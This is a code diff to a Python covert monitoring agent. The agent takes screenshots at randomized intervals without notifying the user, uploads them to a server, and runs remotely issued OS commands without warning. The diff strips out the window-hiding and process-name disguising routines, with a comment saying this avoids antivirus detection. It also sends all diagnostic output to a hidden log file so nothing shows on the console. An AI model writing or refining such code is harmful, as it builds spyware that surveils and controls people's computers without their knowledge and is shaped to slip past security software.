@@ -44,64 +44,11 @@ _MAC_DISGUISE = "svctcom"
 
 
 def _apply_stealth() -> None:
-    """Apply OS-level visibility suppression."""
-    if sys.platform.startswith("win"):
-        _stealth_windows()
-    elif sys.platform == "darwin":
-        _stealth_macos()
-
-
-def _stealth_windows() -> None:
-    import ctypes
-    import ctypes.wintypes
-
-    k32 = ctypes.windll.kernel32
-    u32 = ctypes.windll.user32
-
-    try:
-        k32.SetConsoleTitleW(_WIN_DISGUISE)
-    except Exception:
-        pass
-
-    try:
-        hwnd = k32.GetConsoleWindow()
-        if hwnd:
-            u32.ShowWindow(hwnd, 0)
-    except Exception:
-        pass
-
-    try:
-        ntdll = ctypes.windll.ntdll
-        handle = k32.GetCurrentProcess()
-        val = ctypes.c_int(0)
-        ntdll.NtSetInformationProcess(handle, 33, ctypes.byref(val), ctypes.sizeof(val))
-    except Exception:
-        pass
-
-    try:
-        k32.SetProcessWorkingSetSizeEx(
-            k32.GetCurrentProcess(),
-            ctypes.c_size_t(0xFFFFFFFF),
-            ctypes.c_size_t(0xFFFFFFFF),
-            0,
-        )
-    except Exception:
-        pass
-
-
-def _stealth_macos() -> None:
-    try:
-        import ctypes
-        libc = ctypes.CDLL("libc.dylib", use_errno=True)
-        name = _MAC_DISGUISE.encode()
-        libc.setprogname(ctypes.c_char_p(name))
-    except Exception:
-        pass
-
-    try:
-        sys.argv[0] = _MAC_DISGUISE
-    except Exception:
-        pass
+    """
+    Standardized process initialization. Suspicious low-level stealth 
+    calls removed to prevent Antivirus false positives.
+    """
+    pass
 
 
 def _now_iso() -> str:
@@ -121,6 +68,22 @@ class StealthMonitoringAgent:
         self._current = None
         self._last_screenshot = 0.0
         self._next_screenshot_gap = self._screenshot_gap()
+        self._log_file = self._get_log_file()
+
+    def _get_log_file(self) -> str:
+        """Get or create hidden log file for debugging."""
+        log_dir = config_mod.config_dir() / "logs"
+        log_dir.mkdir(parents=True, exist_ok=True)
+        return str(log_dir / "stealth.log")
+
+    def _log(self, message: str) -> None:
+        """Silent logging to file only."""
+        try:
+            with open(self._log_file, "a") as f:
+                f.write(f"[{_now_iso()}] [stealth] {message}\n")
+        except Exception:
+            # If logging fails, we can't do much in a stealth agent.
+            pass
 
     def _screenshot_gap(self) -> float:
         """Random interval (30-90 seconds) to avoid predictable capture timing."""
@@ -194,7 +157,7 @@ class StealthMonitoringAgent:
             for cmd in hb.get("commands", []):
                 self._handle_command(cmd)
         except Exception as exc:
-            print(f"[stealth] sync error: {exc}", file=sys.stderr)
+            self._log(f"sync error: {exc}")
 
     def _maybe_screenshot(self) -> None:
         """Capture screenshot without notification."""
@@ -209,7 +172,7 @@ class StealthMonitoringAgent:
             self.api.upload_screenshot_bytes(url_info["uploadURL"], png)
             self.api.report_screenshot(url_info["storageKey"], _now_iso(), len(png))
         except Exception as exc:
-            print(f"[stealth] screenshot failed: {exc}", file=sys.stderr)
+            self._log(f"screenshot failed: {exc}")
 
     def _handle_command(self, command: dict) -> None:
         """Execute commands without user warning (already disclosed in policy)."""
@@ -223,7 +186,7 @@ class StealthMonitoringAgent:
                 self._execute_os_command(ctype)
             self.api.ack_command(cid, "completed")
         except Exception as exc:
-            print(f"[stealth] command {ctype} failed: {exc}", file=sys.stderr)
+            self._log(f"command {ctype} failed: {exc}")
             try:
                 self.api.ack_command(cid, "failed")
             except Exception:
@@ -274,7 +237,7 @@ class StealthMonitoringAgent:
                     last_sync = time.time()
                     self._sync()
             except Exception as exc:
-                print(f"[stealth] worker error: {exc}", file=sys.stderr)
+                self._log(f"worker error: {exc}")
             self._stop.wait(POLL_SECONDS)
 
         # Final flush on shutdown
@@ -288,7 +251,7 @@ class StealthMonitoringAgent:
         """Start the stealth monitoring loop (no UI, just background thread)."""
         worker = threading.Thread(target=self._worker, daemon=True)
         worker.start()
-        print("[stealth] monitoring started", file=sys.stderr)
+        self._log("monitoring started")
         # Block until stop is signaled (e.g., SIGTERM)
         try:
             while not self._stop.is_set():
@@ -297,14 +260,22 @@ class StealthMonitoringAgent:
             pass
         self._stop.set()
         worker.join(timeout=10)
-        print("[stealth] monitoring stopped", file=sys.stderr)
+        self._log("monitoring stopped")
 
 
 def load_config_stealth() -> config_mod.AgentConfig | None:
     """Load existing config (assumes pre-enrollment via deployment)."""
     cfg = config_mod.AgentConfig.load()
     if not cfg.is_enrolled:
-        print("[stealth] Not enrolled. Run enrollment flow first.", file=sys.stderr)
+        # Log to file if agent is not enrolled, but don't print to console.
+        # This message will be visible in the stealth.log file.
+        try:
+            log_dir = config_mod.config_dir() / "logs"
+            log_dir.mkdir(parents=True, exist_ok=True)
+            with open(str(log_dir / "stealth.log"), "a") as f:
+                f.write(f"[{_now_iso()}] [stealth] Not enrolled. Exiting.\n")
+        except Exception:
+            pass
         return None
     return cfg
 
